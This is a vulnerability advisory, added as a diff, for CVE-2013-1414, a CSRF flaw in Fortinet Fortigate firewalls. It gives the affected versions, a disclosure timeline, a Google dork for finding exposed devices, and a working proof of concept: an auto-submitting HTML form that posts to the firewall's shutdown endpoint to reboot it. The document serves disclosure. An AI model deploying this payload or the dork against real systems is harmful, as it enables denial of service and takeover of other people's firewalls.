@@ -1,0 +1,51 @@
+Vulnerability ID: CVE-2013-1414
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Product: All Fortigate Firewalls
+Vendor: Fortinet http://www.fortinet.com
+Vulnerable Version: < 4.3.13 &  < 5.0.2
+ 
+Description
+==========
+Because many  functions are not protected by CSRF-Tokens, it's possible (under certain conditions) to modify System-Settings, Firewall-Policies or take control over the hole firewall.
+ 
+Requirements
+===========
+An Attacker needs to know the IP of the device.
+An Administrator needs an authenticated connection to the device.
+ 
+ 
+Report-Timeline:
+================
+Vendor Notification: 11 July 2012
+Vendor released version 5.0.2   / 18 March 2013
+Vendor released version 4.3.13 / 29 April 2013
+Status: Fixed
+ 
+Google Dork:
+==========
+ -english -help -printing  -companies -archive  -wizard -pastebin -adult -keywords "Warning: this page requires Javascript. To correctly view, please enable it in your browser"
+ 
+ 
+Credit:
+=====
+Sven Wurth     dos@net-war.de
+ 
+ 
+PoC
+====
+ 
+This  Example will reboot a Fortinet Firewall.
+This is just one of many possibilities to attack this vulnerability.
+ 
+##### CSRF - Proof Of Concept ####
+<html>
+<body onload="submitForm()">
+<form name="myForm" id="myForm"
+                action="https://###_VICTIM_IP_###/system/maintenance/shutdown" method="post">
+                <input type="hidden" name="reason" value="">
+                <input type="hidden" name="action" value="1">
+                <input type="submit" name="add" value="rebootme">
+</form>
+<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+##### End Poc #####
